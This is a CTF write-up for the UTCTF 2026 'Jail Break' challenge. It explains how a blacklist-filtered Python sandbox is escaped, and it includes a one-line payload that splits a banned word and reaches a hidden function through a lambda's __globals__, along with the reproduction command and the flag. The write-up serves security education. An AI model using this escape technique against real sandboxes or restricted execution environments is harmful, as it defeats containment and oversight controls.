---
title: "UTCTF 2026: Jail Break"
description: "Writeup for Jail Break from UTCTF 2026. Challenge weight: 927 points."
slug: utctf-jail-break
date: 2026-03-13 01:03:18.764+0000
competition: "UTCTF 2026"
categories:
    - Misc
tags:
    - writeup
    - utctf-2026
    - jail-break
---

## Challenge

- Competition: `UTCTF 2026`
- Challenge: `Jail Break`
- Category: `Misc`
- Points: `927`


## Solve Path

1) Category detection

- Detected category: `misc`
- Confidence: high
- Evidence: `jail.py` is a Python sandbox with a blacklist-based filter and a hidden `_secret()` function that returns the flag.

2) Attack strategy

- Primary hypothesis: the jail can be bypassed by accessing the exec globals indirectly instead of typing banned words directly.
- Why it is minimal: the blacklist only scans the raw input string for substrings like `secret`, but runtime string concatenation is still allowed.
- Validation test: use a lambda’s `__globals__` to fetch `_'+'se'+'cret'` and call it.

3) Execution steps

- Relevant logic in `jail.py`:
  - `_secret()` returns `''.join(chr(b ^ _KEY) for b in _ENC)`
  - user input is blocked only if a banned substring appears literally
  - `exec(..., GLOBALS)` exposes `_secret` in globals
- Working payload:
```python
print((lambda:0).__globals__['_'+'se'+'cret']())
```
- Repro:
```powershell
@'
print((lambda:0).__globals__['_'+'se'+'cret']())
'@ | python '`Downloads/jail.py`'
```
- Output:
```text
utflag{py_ja1l_3sc4p3_m4st3r}
```

4) FLAG

`utflag{py_ja1l_3sc4p3_m4st3r}`

5) Writeup

The sandbox is not secure because it relies on substring blacklisting. `_secret` is intentionally left in `GLOBALS`, and the filter only rejects input containing the literal text `secret`. By building the key at runtime as `_'+'se'+'cret'`, the input avoids the blacklist while still resolving to `_secret`. Accessing it through `(lambda:0).__globals__` returns the hidden function, and calling it prints the flag.
